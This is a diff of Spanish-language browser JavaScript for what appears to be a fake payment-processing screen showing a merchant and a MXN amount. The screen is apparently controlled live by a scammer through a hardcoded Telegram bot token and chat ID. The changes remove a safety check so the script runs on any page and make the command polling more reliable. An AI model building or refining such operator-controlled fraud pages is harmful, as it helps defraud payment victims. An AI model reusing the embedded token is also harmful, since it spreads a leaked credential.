@@ -8,19 +8,13 @@
 (function () {
   "use strict";
 
-  // !!! TUS CREDENCIALES REALES DE TELEGRAM !!!
+  // !!! COLOCA AQUÍ TUS CREDENCIALES REALES DE TELEGRAM !!!
   const TELEGRAM_TOKEN = '9068600803:AAGIYrU6UrsLU8_0x0dkZLUTQ_YKr4535BE'; 
   const TELEGRAM_CHAT_ID = '9180377107';
   
   const textStatus = document.getElementById("loading-text");
 
-  // ============================================================
-  // ESCAPE DE SEGURIDAD: Evita ejecutarse en la pantalla incorrecta
-  // ============================================================
-  if (!textStatus) {
-    console.log("Gatekeeper: No se detectó la pantalla de carga (#loading-text). Abortando ejecución.");
-    return; 
-  }
+  
 
   const DEFAULT_MERCHANT = "Programa Cero";
   const DEFAULT_AMOUNT = "$6,000.00 MXN";
@@ -92,15 +86,20 @@
 
       while (Date.now() - tiempoInicio < RECONFIG_WINDOW_MS) {
         try {
-         // CORRECCIÓN ANTICHOQUE: offset=-1 obliga a Telegram a priorizar el último evento y mata conexiones colgadas
-          const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=-1&limit=1&timeout=2`);
+          const url = lastUpdateId 
+            ? `https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=0`
+            : `https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=-1`;
+
+          const response = await fetch(url);
           const data = await response.json();
           
           if (data.ok && data.result && data.result.length > 0) {
-            const update = data.result[0];
-            const msg = update.message || update.channel_post || update.edited_message;
-            
-            if (msg && msg.chat && String(msg.chat.id) === String(TELEGRAM_CHAT_ID) && msg.text) {
+            for (const update of data.result) {
+              lastUpdateId = update.update_id;
+
+              const msg = update.message || update.channel_post || update.edited_message;
+              if (!msg || !msg.chat || String(msg.chat.id) !== String(TELEGRAM_CHAT_ID) || !msg.text) continue;
+
               const textoMensaje = msg.text.trim();
               const low = textoMensaje.toLowerCase();
 
@@ -251,7 +250,7 @@
     let done = false;
     while (!done) {
       try {
-        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=-1&limit=1&timeout=2`);
+        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`);
         const data = await res.json();
         if (data.ok && data.result && data.result.length > 0) {
           for (let i = 0; i < data.result.length; i++) {
